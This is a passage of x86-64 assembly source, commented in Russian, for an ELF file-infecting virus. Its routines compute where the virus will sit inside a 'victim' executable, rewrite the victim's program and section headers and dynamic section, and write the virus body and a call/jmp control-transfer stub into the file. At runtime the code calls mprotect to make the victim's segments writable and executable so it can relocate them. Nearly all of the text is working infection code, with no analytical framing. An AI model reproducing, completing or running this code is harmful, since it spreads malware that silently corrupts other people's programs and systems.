    pop     %rbx
    ret

/// _COUNT_OFFSET_TO_E_ENTRY_FRM_FILE_BEGIN
/// считаем смещение от начала файла до оригинального
/// e_entry
_count_offset_to_e_entry_frm_file_begin:
    push    %rsi
    push    %rdx

    mov     first_seg_vaddr(%rip), %rsi
    test    %rsi, %rsi
    je      _count_offset_to_e_entry_frm_file_begin_fail

    mov     original_e_entry(%rip), %rdx
    test    %rdx, %rdx
    je      _count_offset_to_e_entry_frm_file_begin_fail

    sub     %rsi, %rdx
    mov     %rdx, offset_to_e_entry_frm_file_begin(%rip)

_count_offset_to_e_entry_frm_file_begin_success:
    xor     %rax, %rax
    jmp     _count_offset_to_e_entry_frm_file_begin_exit

_count_offset_to_e_entry_frm_file_begin_fail:
    mov      $-1, %rax

_count_offset_to_e_entry_frm_file_begin_exit:
    pop     %rdx
    pop     %rsi

    ret

///_COUNT_FRM_ORIG_E_ENTRY_TO_VIRUS_E_ENTRY_OFFSET
/// считает смещение от нового e_entry
/// до оригинального
_count_frm_orig_e_entry_to_virus_e_entry_offset:
    push    %rcx
    push    %rdx

    mov     virus_new_vaddr(%rip), %rcx
    test    %rcx, %rcx
    je     _count_frm_orig_e_entry_to_virus_e_entry_offset_fail

    mov     original_e_entry(%rip), %rdx
    test    %rdx, %rdx
    je     _count_frm_orig_e_entry_to_virus_e_entry_offset_fail

    sub     %rdx, %rcx
    mov     %rcx, frm_orig_e_entry_to_virus_e_entry_offset(%rip)

_count_frm_orig_e_entry_to_virus_e_entry_offset_success:
    xor     %rax, %rax
    jmp     _count_frm_orig_e_entry_to_virus_e_entry_offset_exit

_count_frm_orig_e_entry_to_virus_e_entry_offset_fail:
    mov      $-1, %rax

_count_frm_orig_e_entry_to_virus_e_entry_offset_exit:
    pop     %rdx
    pop     %rcx

    ret


/// _GET_VIRUS_CODE
///
/// Читает указатель начала кода вируса и размер этого
/// кода.
/// Записывает адрес кода вируса в virus_code_addr и
/// размер этого кода в virus_code_size
_get_virus_code:
    push    %rdi
    push    %rsi

    leaq    _start(%rip), %rdi  # начало вируса
    mov     %rdi, virus_code_addr(%rip)

    leaq    _global_exit(%rip), %rsi
    sub     %rdi, %rsi  # virus size до exit_victim

    # exit + размер блока передачи управления
    mov     transfer_control_code_size(%rip), %rax
    add     %rax, %rsi

    leaq    virus_code_size(%rip), %rdi
    mov     %rsi, (%rdi)

_get_virus_code_success:
    xor     %rax, %rax
    movq    $0, get_virus_success(%rip)

    pop     %rsi
    pop     %rdi

    ret

/// _MAKE_VIRUS_NEW_VADDR
/// Считает виртуальный адрес вируса внутри
/// инфицированной жертвы
/// Адрес считается как
/// vaddr последнего загружаемого сегмента кода жертвы +
/// ее выравнивание + смещение до кода вируса в файле
_count_virus_new_vaddr:
    push    %rbx
    push    %rcx

    mov     last_seg_vaddr(%rip), %rax
    test    %rax, %rax
    je      _count_virus_new_vaddr_fail

    mov    	last_seg_allign(%rip), %rbx

    and     $~0xFFF, %rax
	add     %rbx, %rax

	mov     victim_elf_addr(%rip), %rbx
    test    %rbx, %rbx
    je      _count_virus_new_vaddr_fail

	mov     ELF_E_SHOFF(%rbx), %rbx
	add     $0x38, %rbx
    mov     new_bind_now_flag_record_size(%rip), %rcx
    add     %rcx, %rbx
	add     %rbx, %rax

    mov     %rax, virus_new_vaddr(%rip)

_count_virus_new_vaddr_success:
    xor     %rax, %rax
    jmp     _count_virus_new_vaddr_exit

_count_virus_new_vaddr_fail:
    mov      $-1, %rax

_count_virus_new_vaddr_exit:
	pop     %rcx
	pop     %rbx

    ret

/// _RECOUNT_VICTIM
/// Пересчитывает данные жертвы
_recount_victim:
    call    _recount_symbols_addrs
    test    %rax, %rax
    jne     _recount_victim_fail

    call    _recount_rela_sections
    test    %rax, %rax
    jne     _recount_hdrs

_recount_hdrs:
    call    _shdr_offset_and_addr_recount
    test    %rax, %rax
    jne     _recount_victim_fail

    call    _phdr_offset_and_addr_recount
    test    %rax, %rax
    jne     _recount_victim_fail

_recount_dynamic_and_got:
    call    _recount_dynamic_section
    test    %rax, %rax
    jne     _generate_virus_data

    call    _recount_got_section

_generate_virus_data:
    call    _count_virus_new_vaddr
    test    %rax, %rax
    jne     _recount_victim_fail

    call    _generate_virus_phdr
    test    %rax, %rax
    jne     _recount_victim_fail

    call    _generate_virus_shdr
    test    %rax, %rax
    jne     _recount_victim_fail

    call    _generate_bind_now_flag_record

_recount_elf_hdr:
    call    _edit_elf_hdr
    test    %rax, %rax
    jne     _recount_victim_fail

_count_offsets:
    call    _count_offset_to_orig_e_entry
    test    %rax, %rax
    jne     _recount_victim_fail

    call    _count_offset_to_move_victim
    test    %rax, %rax
    jne     _recount_victim_fail

    call    _count_offset_to_e_entry_frm_file_begin
    test    %rax, %rax
    jne     _recount_victim_fail

    call    _count_frm_orig_e_entry_to_virus_e_entry_offset
    test    %rax, %rax
    jne     _recount_victim_fail

_make_opcode_blocks:
    call    _transfer_control_to_victim
    test    %rax, %rax
    jne     _recount_victim_fail

    call    _make_victim_data_block_with_dynamic_data
    test    %rax, %rax
    je     _recount_victim_success

    call    _make_victim_data_block_without_dynamic_data
    test    %rax, %rax
    jne     _recount_victim_fail

_recount_victim_success:
    movq    $0, recount_success(%rip)
    xor     %rax, %rax
    jmp     _recount_victim_exit

_recount_victim_fail:
    mov      $-1, %rax

_recount_victim_exit:
    ret


/// _OPEN_INTERM_FILE
/// открывает промежуточный файл
_open_interm_file:
    push    %rdi
    push    %rsi
    push    %rdx

    lea     new_elf_file(%rip), %rdi
    // RDWR + O_CREAT
    mov     $0x42, %rsi
    // разрешение на rwx
    mov     $0x1ff, %rdx
    mov     $0x2, %rax  # fopen syscall
    syscall
    test    %rax, %rax
    jl      _open_interm_file_fail

_open_interm_file_success:
    mov     %rax, interm_fd_file(%rip)
    xor     %rax, %rax
    jmp     _open_interm_file_exit

_open_interm_file_fail:
    mov     $-1, %rax

_open_interm_file_exit:
    pop     %rdx
    pop     %rsi
    pop     %rdi

    ret

/// _RECOMBINE_ELF_WITHOUT_NEW_BIND_NOW
/// Перекомпоновывает эльф
_recombine_elf:
    push    %rdi
    push    %rsi
    push    %rdx

    // промежуточный файл открыт?
    // mov     interm_fd_file(%rip), %rdi
    mov     fd(%rip), %rdi

    mov     %rdi, interm_fd_file(%rip)

    test    %rdi, %rdi
    je      _recombine_elf_fail

    // этапы парсинга жертвы, получения данных вируса
    // и пересчитывания жертвы прошли успешно?
    mov     parse_success(%rip), %rdx
    test    %rdx, %rdx
    jne      _recombine_elf_fail

    mov     recount_success(%rip), %rdx
    test    %rdx, %rdx
    jne      _recombine_elf_fail

    mov     get_virus_success(%rip), %rdx
    test    %rdx, %rdx
    jne      _recombine_elf_fail

    // тогда переколбашиваем эльф
_recombine_cur_elf:
    call    _write_till_phdr_table_end
    test    %rax, %rax
    jne     _recombine_elf_fail

    call    _write_new_phdr_virus
    test    %rax, %rax
    jne     _recombine_elf_fail

    call    _write_whole_victim
    test    %rax, %rax
    je      _write_end_of_file

    call    _write_victim_code_with_bind_now
    test    %rax, %rax
    jne     _recombine_elf_fail

_write_end_of_file:
    call    _write_virus_code
    test    %rax, %rax
    jne     _recombine_elf_fail

    call    _write_transfer_control_code_block
    test    %rax, %rax
    jne     _recombine_elf_fail

    call    _write_data_block
    test    %rax, %rax
    jne     _recombine_elf_fail

    call    _write_victim_shdrs
    test    %rax, %rax
    jne     _recombine_elf_fail

    call    _write_virus_new_shdr
    test    %rax, %rax
    jne     _recombine_elf_fail

_recombine_elf_success:
    xor     %rax, %rax
    jmp     _recombine_elf_exit

_recombine_elf_fail:
    mov     $-1, %rax

_recombine_elf_exit:
    pop     %rdx
    pop     %rsi
    pop     %rdi
    ret

/// _WRITE_TILL_PHDR_TABLE_END
/// Вписывает в файл жертву от ее начала до
/// конца таблицы заголовков сегментов
_write_till_phdr_table_end:
    push    %rdi
    push    %rsi
    push    %rdx
    push    %rcx
    push    %r10

    mov     interm_fd_file(%rip), %rdi
    mov     victim_elf_addr(%rip), %rsi
    mov     victim_phdr_table_size(%rip), %rdx
    add     $0x40, %rdx

    mov     file_offset(%rip), %rcx
    mov     %rcx, %r10
    mov     %rcx, %r8

    add     %rdx, %r8
    mov     %r8, file_offset(%rip)

    mov     $0x12, %rax   # syscall pwrite
    syscall

    test   %rax, %rax
    je     _write_till_phdr_table_end_fail

_write_till_phdr_table_end_success:
    xor     %rax, %rax
    jmp     _write_till_phdr_table_end_exit

_write_till_phdr_table_end_fail:
    mov     $-1, %rax

_write_till_phdr_table_end_exit:
    pop     %r10
    pop     %rcx
    pop     %rdx
    pop     %rsi
    pop     %rdi

    ret


/// _WRITE_NEW_PHDR_VIRUS
/// Вписывает новый заголовок в жертву
_write_new_phdr_virus:
    push    %rdi
    push    %rsi
    push    %rdx
    push    %rcx
    push    %r10

    mov     interm_fd_file(%rip), %rdi
    leaq    virus_new_phdr(%rip), %rsi
    mov     $0x38, %rdx

    mov     file_offset(%rip), %rcx
    mov     %rcx, %r10
    mov     %rcx, %r8

    add     %rdx, %r8
    mov     %r8, file_offset(%rip)

    mov     $0x12, %rax   # syscall pwrite
    syscall

    test   %rax, %rax
    je     _write_new_phdr_virus_fail

_write_new_phdr_virus_success:
    xor     %rax, %rax
    jmp     _write_new_phdr_virus_exit

_write_new_phdr_virus_fail:
    mov     $-1, %rax

_write_new_phdr_virus_exit:
    pop     %r10
    pop     %rcx
    pop     %rdx
    pop     %rsi
    pop     %rdi
    ret


/// _WRITE_WHOLE_VICTIM
/// Записывает код жертвы
/// одним вызовом в файл
_write_whole_victim:
    push    %rdi
    push    %rsi
    push    %rdx
    push    %rcx
    push    %r10

    mov     new_bind_now_flag_record_size(%rip), %rdi
    test    %rdi, %rdi
    jne     _write_whole_victim_fail

    mov     interm_fd_file(%rip), %rdi
    mov     victim_code_addr(%rip), %rsi
    mov     victim_code_size(%rip), %rdx

    mov     file_offset(%rip), %rcx
    mov     %rcx, %r10
    mov     %rcx, %r8

    add     %rdx, %r8
    mov     %r8, file_offset(%rip)

    mov     $0x12, %rax   # syscall pwrite
    syscall

    test   %rax, %rax
    je     _write_whole_victim_fail

_write_whole_victim_success:
    xor     %rax, %rax
    jmp     _write_whole_victim_exit

_write_whole_victim_fail:
    mov     $-1, %rax

_write_whole_victim_exit:
    pop     %r10
    pop     %rcx
    pop     %rdx
    pop     %rsi
    pop     %rdi
    ret

/// _WRITE_WHOLE_VICTIM
/// Записывает код жертвы
/// одним вызовом в файл
_write_virus_code:
    push    %rdi
    push    %rsi
    push    %rdx
    push    %rcx
    push    %r10

    mov     interm_fd_file(%rip), %rdi
    mov     virus_code_addr(%rip), %rsi
    mov     virus_code_size(%rip), %rdx

    mov     transfer_control_code_size(%rip), %rax
    sub     %rax, %rdx

    mov     file_offset(%rip), %rcx
    mov     %rcx, %r10
    mov     %rcx, %r8

    add     %rdx, %r8
    mov     %r8, file_offset(%rip)

    mov     $0x12, %rax   # syscall pwrite
    syscall

    test   %rax, %rax
    je     _write_virus_code_fail

_write_virus_code_success:
    xor     %rax, %rax
    jmp     _write_virus_code_exit

_write_virus_code_fail:
    mov     $-1, %rax

_write_virus_code_exit:
    pop     %r10
    pop     %rcx
    pop     %rdx
    pop     %rsi
    pop     %rdi
    ret

/// _WRITE_TRANSFER_CONTROL_CODE_BLOCK
/// Записывает код жертвы
/// одним вызовом в файл
_write_transfer_control_code_block:
    push    %rdi
    push    %rsi
    push    %rdx
    push    %rcx
    push    %r10

    mov     interm_fd_file(%rip), %rdi
    leaq    transfer_control_code(%rip), %rsi
    mov     transfer_control_code_size(%rip), %rdx

    mov     file_offset(%rip), %rcx
    mov     %rcx, %r10
    mov     %rcx, %r8

    add     %rdx, %r8
    mov     %r8, file_offset(%rip)

    mov     $0x12, %rax   # syscall pwrite
    syscall

    test   %rax, %rax
    je     _write_transfer_control_code_block_fail

_write_transfer_control_code_block_success:
    xor     %rax, %rax
    jmp     _write_transfer_control_code_block_exit

_write_transfer_control_code_block_fail:
    mov     $-1, %rax

_write_transfer_control_code_block_exit:
    pop     %r10
    pop     %rcx
    pop     %rdx
    pop     %rsi
    pop     %rdi
    ret

/// _WRITE_DATA_BLOCK
/// Записывает код жертвы
/// одним вызовом в файл
_write_data_block:
    push    %rdi
    push    %rsi
    push    %rdx
    push    %rcx
    push    %r10

    mov     interm_fd_file(%rip), %rdi
    leaq    data_block(%rip), %rsi
    mov     data_size(%rip), %rdx

    mov     file_offset(%rip), %rcx
    mov     %rcx, %r10
    mov     %rcx, %r8

    add     %rdx, %r8
    mov     %r8, file_offset(%rip)

    mov     $0x12, %rax   # syscall pwrite
    syscall

    test   %rax, %rax
    je     _write_data_block_fail

_write_data_block_success:
    xor     %rax, %rax
    jmp     _write_data_block_exit

_write_data_block_fail:
    mov     $-1, %rax

_write_data_block_exit:
    pop     %r10
    pop     %rcx
    pop     %rdx
    pop     %rsi
    pop     %rdi
    ret

/// _WRITE_VICTIM_SHDRS
///  Пишет таблицу заголовков секций
_write_victim_shdrs:
    push    %rdi
    push    %rsi
    push    %rdx
    push    %rcx
    push    %r10

    mov     interm_fd_file(%rip), %rdi
    mov     victim_shdr_table_addr(%rip), %rsi
    mov     victim_shdr_table_size(%rip), %rdx

    mov     file_offset(%rip), %rcx
    mov     %rcx, %r10
    mov     %rcx, %r8

    add     %rdx, %r8
    mov     %r8, file_offset(%rip)

    mov     $0x12, %rax   # syscall pwrite
    syscall

    test   %rax, %rax
    je     _write_data_block_fail

_write_victim_shdrs_success:
    xor     %rax, %rax
    jmp     _write_victim_shdrs_exit

_write_victim_shdrs_fail:
    mov     $-1, %rax

_write_victim_shdrs_exit:
    pop     %r10
    pop     %rcx
    pop     %rdx
    pop     %rsi
    pop     %rdi
    ret

/// _WRITE_VICTIM_SHDRS
///  Пишет таблицу заголовков секций
_write_virus_new_shdr:
    push    %rdi
    push    %rsi
    push    %rdx
    push    %rcx
    push    %r10

    mov     interm_fd_file(%rip), %rdi
    leaq    virus_new_shdr(%rip), %rsi
    mov     $0x40, %rdx

    mov     file_offset(%rip), %rcx
    mov     %rcx, %r10
    mov     %rcx, %r8

    add     %rdx, %r8
    mov     %r8, file_offset(%rip)

    mov     $0x12, %rax   # syscall pwrite
    syscall

    test   %rax, %rax
    je     _write_virus_new_shdr_fail

_write_virus_new_shdr_success:
    xor     %rax, %rax
    jmp     _write_virus_new_shdr_exit

_write_virus_new_shdr_fail:
    mov     $-1, %rax

_write_virus_new_shdr_exit:
    pop     %r10
    pop     %rcx
    pop     %rdx
    pop     %rsi
    pop     %rdi
    ret

/// _WRITE_VICTIM_CODE_WITH_BIMD_NOW
/// Вписывает жертву с записью BIND_NOW
_write_victim_code_with_bind_now:
    push    %rdi
    push    %rsi
    push    %rdx
    push    %rcx
    push    %r10

    mov     new_bind_now_flag_record_size(%rip), %rdi
    test    %rdi, %rdi
    je      _write_victim_code_with_bind_now_fail

    mov     file_offset(%rip), %rcx
    mov     %rcx, %r10
    mov     %rcx, %r8

    mov     victim_code_before_bind_now_addr(%rip), %rsi
    mov     victim_code_before_bind_now_size(%rip), %rdx

    add     %rdx, %r8
    mov     interm_fd_file(%rip), %rdi
    mov     $0x12, %rax
    syscall

    test   %rax, %rax
    je     _write_victim_code_with_bind_now_fail

    // вписываем запись BIND_NOW
    mov     %r8, %rcx
    mov     %rcx, %r10

    leaq    bind_now_flag_record(%rip), %rsi
    mov     new_bind_now_flag_record_size(%rip), %rdx

    add     %rdx, %r8

    mov     interm_fd_file(%rip), %rdi
    mov     $0x12, %rax   # syscall pwrite
    syscall

    test   %rax, %rax
    je     _write_victim_code_with_bind_now_fail

    // вписываем жертву от точки, куда вставили
    // запись BIND_NOW, до конца
    mov     %r8, %rcx
    mov     %rcx, %r10

    mov     victim_code_after_bind_now_addr(%rip), %rsi
    mov     victim_code_after_bind_now_size(%rip), %rdx

    add     %rdx, %r8

    mov     interm_fd_file(%rip), %rdi
    mov     $0x12, %rax   # syscall pwrite
    syscall

    mov    %r8, file_offset(%rip) # 0x401918
    test   %rax, %rax
    je     _write_victim_code_with_bind_now_fail

_write_victim_code_with_bind_now_success:
    xor    %rax, %rax
    jmp     _write_victim_code_with_bind_now_exit

_write_victim_code_with_bind_now_fail:
    mov     $-1, %rax

_write_victim_code_with_bind_now_exit:
    pop     %r10
    pop     %rcx
    pop     %rdx
    pop     %rsi
    pop     %rdi
    ret

/// _TRANSFER_CONTROL_TO_VICTIM
/// создает блок кода для передачи
/// управления на жертву - записывает опкоды
/// операций и необходимые смещения
transfer_control_code_size:
    .quad  0xB

transfer_control_code:
    .space  0xB, 0

_transfer_control_to_victim:
    push    %rbx

    lea     transfer_control_code(%rip), %rax
    mov     $0xe8, %rbx
    movzwl  %bx, %ebx

    // call opcode
    movb    %bl, (%rax)
    inc     %rax

    // offset
    mov     move_victim_offset(%rip), %rbx
    test    %rbx, %rbx
    je      _transfer_control_to_victim_fail

    mov     %ebx, (%rax)
    add     $0x4, %rax

    mov     $0xe9, %rbx
    movzwl  %bx, %ebx

    // call opcode
    movb    %bl, (%rax)
    inc     %rax

    mov     offset_to_e_entry(%rip), %rbx
    test    %rbx, %rbx
    je      _transfer_control_to_victim_fail

    mov     %ebx, (%rax)
    add     $0x4, %rax

    // nop opcode
    mov     $0x90, %rbx
    movzwl  %bx, %ebx
    movb    %bl, (%rax)

_transfer_control_to_victim_success:
    xor     %rax, %rax
    jmp     _transfer_control_to_victim_exit

_transfer_control_to_victim_fail:
    mov     $-1, %rax

_transfer_control_to_victim_exit:
    pop     %rbx
    ret

/// _MAKE_VICTIM_DATA_BLOCK_WITHOUT_DYNAMIC_DATA
/// создает блок с данными жертвы в случае,
/// если секции dynamic НЕТ
_make_victim_data_block_without_dynamic_data:
    push    %rbx
    push    %rcx

    // если секция dynamic есть,
    // этот блоккода не подходит
    mov     dynamic_records_vaddr(%rip), %rbx
    test    %rbx, %rbx
    jne     _make_victim_data_block_without_dynamic_data_fail

    // иначе начинаем записывать данные, проверяя
    // наличие критически важных
    leaq    data_block(%rip), %rax

    mov     first_seg_vaddr(%rip), %rbx
    test    %rbx, %rbx
    je      _make_victim_data_block_without_dynamic_data_fail

    movq    %rbx, (%rax)
    add     $0x8, %rax

    mov     virus_new_vaddr(%rip), %rbx
    test    %rbx, %rbx
    je      _make_victim_data_block_without_dynamic_data_fail

    movq    %rbx, (%rax)
    add     $0x8, %rax

    mov     offset_to_e_entry_frm_file_begin(%rip), %rbx
    test    %rbx, %rbx
    je      _make_victim_data_block_without_dynamic_data_fail

    add     $0x38, %rbx
    movq    %rbx, (%rax)
    add     $0x8, %rax

    mov     original_e_entry(%rip), %rbx
    test    %rbx, %rbx
    je      _make_victim_data_block_without_dynamic_data_fail

    add     $0x38, %rbx
    movq    %rbx, (%rax)
    add     $0x8, %rax

    mov     frm_orig_e_entry_to_virus_e_entry_offset(%rip), %rbx
    test    %rbx, %rbx
    je      _make_victim_data_block_without_dynamic_data_fail

    sub     $0x38, %rbx
    movq    %rbx, (%rax)
    add     $0x8, %rax

    mov     victim_code_offset(%rip), %rbx
    test    %rbx, %rbx
    je      _make_victim_data_block_without_dynamic_data_fail

    add     $0x38, %rbx
    movq    %rbx, (%rax)
    add     $0x8, %rax

    mov     new_bind_now_flag_record_size(%rip), %rbx
    movq    %rbx, (%rax)

    xor     %rax, %rax
    jmp     _make_victim_data_block_without_dynamic_data_exit
_make_victim_data_block_without_dynamic_data_fail:
    mov     $-1, %rax

_make_victim_data_block_without_dynamic_data_exit:
    pop     %rcx
    pop     %rbx
    ret


/// _MAKE_VICTIM_DATA_BLOCK_WITH_DYNAMIC_DATA
/// создает блок с данными жертвы в случае,
/// если секция dynamic ЕСТЬ
_make_victim_data_block_with_dynamic_data:
    push    %rbx
    push    %rcx

    // если секции dynamic нет,
    // этот блок кода не подходит
    mov     dynamic_records_vaddr(%rip), %rbx
    test    %rbx, %rbx
    je     _make_victim_data_block_with_dynamic_data_fail

    // иначе начинаем записывать данные, проверяя
    // наличие критически важных
    leaq    data_block(%rip), %rax

    mov     first_seg_vaddr(%rip), %rbx
    test    %rbx, %rbx
    je      _make_victim_data_block_with_dynamic_data_fail

    movq    %rbx, (%rax)
    add     $0x8, %rax

    mov     virus_new_vaddr(%rip), %rbx
    test    %rbx, %rbx
    je      _make_victim_data_block_with_dynamic_data_fail

    movq    %rbx, (%rax)
    add     $0x8, %rax

    mov     offset_to_e_entry_frm_file_begin(%rip), %rbx
    test    %rbx, %rbx
    je     _make_victim_data_block_with_dynamic_data_fail

    add     $0x38, %rbx
    movq    %rbx, (%rax)
    add     $0x8, %rax

    mov     original_e_entry(%rip), %rbx
    test    %rbx, %rbx
    je     _make_victim_data_block_with_dynamic_data_fail

    add     $0x38, %rbx
    movq    %rbx, (%rax)
    add     $0x8, %rax

    mov     frm_orig_e_entry_to_virus_e_entry_offset(%rip), %rbx
    test    %rbx, %rbx
    je     _make_victim_data_block_with_dynamic_data_fail

    sub     $0x38, %rbx
    movq    %rbx, (%rax)
    add     $0x8, %rax

    mov     victim_code_offset(%rip), %rbx
    test     %rbx, %rbx
    je     _make_victim_data_block_with_dynamic_data_fail

    add     $0x38, %rbx
    movq    %rbx, (%rax)
    add     $0x8, %rax

    mov     new_bind_now_flag_record_size(%rip), %rbx
    movq    %rbx, (%rax)
    add     $0x8, %rax

    mov     dynamic_records_vaddr(%rip), %rbx
    add     $0x38, %rbx
    movq    %rbx, (%rax)
    add     $0x8, %rax

    mov     dynamic_records_size(%rip), %rbx
    mov     new_bind_now_flag_record_size(%rip), %rcx
    add     %rcx, %rbx
    movq    %rbx, (%rax)
    add     $0x8, %rax

    mov     dynamic_records_offset(%rip), %rbx
    add     $0x38, %rbx
    movq    %rbx, (%rax)

    xor     %rax, %rax
    jmp     _make_victim_data_block_with_dynamic_data_exit

_make_victim_data_block_with_dynamic_data_fail:
    mov     $-1, %rax

_make_victim_data_block_with_dynamic_data_exit:
    pop     %rcx
    pop     %rbx
    ret

/// _GET_MOVE_VICTIM_DATA
/// выгружает данные жертвы из блока данных
/// в переменные
_get_move_victim_data:
    push    %rdi

    leaq    _global_exit(%rip), %rdi
    test    %rdi, %rdi
    je      _get_move_victim_data_fail

    mov     NEW_BIND_NOW_FLAG_RECORD_SIZE(%rdi), %rax
    mov     %rax, new_bind_now_flag_record_size(%rip)

    mov     FRM_ORIG_E_ENTRY_TO_VIRUS_E_ENTRY(%rdi), %rax
    mov     %rax, frm_orig_e_entry_to_virus_e_entry_offset(%rip)

    mov     OFFSET_TO_E_ENTRY_FRM_FILE_BEGIN(%rdi), %rax
    mov     %rax, offset_to_e_entry_frm_file_begin(%rip)

    mov     FIRST_SEGM_VADDR(%rdi), %rax
    mov     %rax, first_seg_vaddr(%rip)

    mov     DYNAMIC_REC_VADDR(%rdi), %rax
    mov     %rax, dynamic_records_vaddr(%rip)

    mov     DYNAMIC_RECORDS_OFFSET(%rdi), %rax
    mov     %rax, dynamic_records_offset(%rip)

    mov     DYNAMIC_REC_SZ(%rdi), %rax
    mov     %rax, dynamic_records_size(%rip)

    mov     VICTIM_CODE_OFFSET(%rdi), %rax
    mov     %rax, victim_code_offset(%rip)

    mov     first_seg_vaddr(%rip), %rax
    mov     victim_code_offset(%rip), %rdi
    add     %rdi, %rax
    mov     %rax, victim_code_frm_begin_vaddr(%rip)

    movq    $-0x38, constant_value(%rip)

_get_move_victim_data_success:
    xor     %rax, %rax
    jmp     _get_move_victim_data_exit

_get_move_victim_data_fail:
    mov     $-1, %rax

_get_move_victim_data_exit:
    pop     %rdi
    ret

/// _COUNT_DYNAMIC_ADDR
/// Считает адрес секции dynamic в памяти
_count_dynamic_addr:
    push    %rbx

    mov     dynamic_records_vaddr(%rip), %rax
    test    %rax, %rax
    je      _count_dynamic_addr_fail

    mov     first_seg_vaddr(%rip), %rbx
    test    %rbx, %rbx
    je      _count_dynamic_addr_fail

    sub     %rbx, %rax

    mov     victim_elf_addr(%rip), %rbx
    test    %rbx, %rbx
    je      _count_dynamic_addr_fail

    add     %rax, %rbx
    mov     %rbx, dynamic_records_addr(%rip)

_count_dynamic_addr_success:
    xor     %rax, %rax
    jmp     _count_dynamic_addr_exit

_count_dynamic_addr_fail:
    mov     $-1, %rax

_count_dynamic_addr_exit:
    pop     %rbx
    ret

/// _GET_SEGM_ADDR_AND_SZ
/// считает адрес, по которому начинается
/// сегмент в памяти, адрес, по которму заканчивается
/// и размер сегмента
_get_segm_addr_and_sz:
    push    %rbx
    push    %rcx
    push    %rdx
    push    %r8

    // проверяем необходимые данные
    mov     cur_seg_hdr_ptr(%rip), %rax
    test    %rax, %rax
    je      _get_segm_addr_and_sz_fail

    mov     victim_elf_addr(%rip), %rbx
    test    %rbx, %rbx
    je      _get_segm_addr_and_sz_fail

    mov     first_seg_vaddr(%rip), %rcx
    test    %rcx, %rcx
    je      _get_segm_addr_and_sz_fail

    // считаем
    mov     PHDR_P_VADDR(%rax), %rbx
    sub     %rcx, %rbx

    // размер сегмента
    mov     PHDR_P_MEMSZ(%rax), %rcx
    mov     %rcx, cur_seg_memsz(%rip)

    // адрес начала сегмента
    mov     victim_elf_addr(%rip), %r8
    add     %r8, %rbx
    mov     %rbx, cur_seg_addr(%rip)

    // адрес конца сегмента
    add     %rcx, %rbx
    mov     %rbx, cur_seg_end_addr(%rip)

_get_segm_addr_and_sz_success:
    xor     %rax, %rax
    jmp     _get_segm_addr_and_sz_exit

_get_segm_addr_and_sz_fail:
    mov     $-1, %rax

_get_segm_addr_and_sz_exit:
    pop     %r8
    pop     %rdx
    pop     %rcx
    pop     %rbx

    ret

/// _MOVE_VICTIM
/// Сдвигает жертву на ее прежние адреса
_move_victim:
    call    _get_move_victim_data
    test    %rax, %rax
    jne     _move_victim_fail

    call    _count_begin_elf_addr_in_memory
    test    %rax, %rax
    jne     _move_victim_fail

    call    _get_phdrs_info
    test    %rax, %rax
    jne     _move_victim_fail

    call    _mprotect_in_loop
    test    %rax, %rax
    jne     _move_victim_fail

    call   _count_dynamic_addr
    test    %rax, %rax
    jne     _move

    call    _recount_dynamic_section

_move:
    call    _move_segments
    test    %rax, %rax
    jne     _move_victim_fail

_move_victim_success:
    ret

_move_victim_fail:
    jmp     _exit_virus



/// _MPROTECT_IN_LOOP
/// Разрешает самомодификацию жертве
/// Проходится по заголовкам сегментов,
/// находит сгменты типа LOAD, читает
/// их виртуальные адреса, пересчитывает в физические
/// вызывает mprotect для каждого сегмента LOAD
_mprotect_in_loop:
    push    %rbx
    push    %rcx
    push    %rdx
    push    %r8
    push    %rdi
    push    %rsi

    mov     victim_phdr_table_addr(%rip), %rdi
    test    %rdi, %rdi
    je      _mprotect_cycle_fail

    mov     victim_phdr_amount(%rip), %rcx
    test    %rcx, %rcx
    je      _mprotect_cycle_fail

_mprotect_cycle:
    // загружаемвый сегмент?
    cmp     $0x1, (%rdi)
    jne     _mprotect_cycle_next

    // высчитать его адрес и в памяти
    // и вызвать для него mprotect
    mov     %rdi, cur_seg_hdr_ptr(%rip)
    call    _get_segm_addr_and_sz
    test    %rax, %rax
    jne     _mprotect_cycle_fail

    // syscall меняет rcx
    mov     %rcx, %r8
    mov     %rdi, %rbx

    mov     cur_seg_addr(%rip), %rdi
    mov     cur_seg_end_addr(%rip), %rsi

    and     $~0xFFF, %rdi  # выровненный адрес
    sub     %rdi, %rsi  # размер памяти

    mov     $0x7, %rdx   # RW+EXEC flags - $RDX
    mov     $0xA, %rax   # mprotect handle
    syscall

    test    %rax, %rax
    jne     _mprotect_cycle_fail

    mov     %r8, %rcx
    mov     %rbx, %rdi

_mprotect_cycle_next:
    add     $0x38, %rdi
    loop    _mprotect_cycle

_mprotect_cycle_success:
    xor     %rax, %rax
    jmp     _mprotect_cycle_exit

_mprotect_cycle_fail:
    mov     $-1, %rax

_mprotect_cycle_exit:
    pop     %rsi
    pop     %rdi
    pop     %r8
    pop     %rdx
    pop     %rcx
    pop     %rbx
    ret

// _COUNT_BEGIN_ELF_ADDR_IN_MEMORY
// Считает адрес, по которому лежит
// инфицированный исполняющийся эльф
_count_begin_elf_addr_in_memory:
    push    %rdi
    push    %rsi

    mov     frm_orig_e_entry_to_virus_e_entry_offset(%rip), %rsi
    test    %rsi, %rsi
    je      _count_begin_elf_addr_in_memory_fail

    mov     offset_to_e_entry_frm_file_begin(%rip), %rdi
    test    %rdi, %rdi
    je      _count_begin_elf_addr_in_memory_fail

    // грузим адрес _start - это будет
    // актульаный e_entry
    leaq    _start(%rip), %rax

    sub     %rsi, %rax
    sub     %rdi, %rax

    mov     %rax, victim_elf_addr(%rip)

_count_begin_elf_addr_in_memory_success:
    xor     %rax, %rax
    jmp    _count_begin_elf_addr_in_memory_exit

_count_begin_elf_addr_in_memory_fail:
    mov     $-1, %rax

_count_begin_elf_addr_in_memory_exit:
    pop     %rsi
    pop     %rdi
    ret

/// _MY_MEMCPY
/// Переписывает код с одного адреса
/// в другой
_my_memcpy:
    pushq    %rcx
    pushq    %rdx
    pushq    %rdi
    pushq    %rsi

    mov     cur_seg_memsz(%rip), %rcx
    test    %rcx, %rcx
    je      _my_memcpy_fail

    mov     cur_seg_addr(%rip), %rsi
    test    %rsi, %rsi
    je      _my_memcpy_fail

    mov     %rsi, %rdi
    sub     $0x38, %rdi

    mov     dynamic_records_addr(%rip), %rax

_cycle_my_memcpy_before_dynamic:

    // этот цикл работает, пока мы
    // перемещаем все до секции dynamic
    movb    (%rsi), %dl
    cmp     %rax, %rsi
    // как только мы на нее наткнулись
    // пропускаем ее
    je      _scip_dynamic
    movb    %dl, (%rdi)

    inc     %rsi
    inc     %rdi

    loop    _cycle_my_memcpy_before_dynamic
    jmp     _my_memcpy_success

    // пропускаем секцию dynamic -
    // не редактируем ее
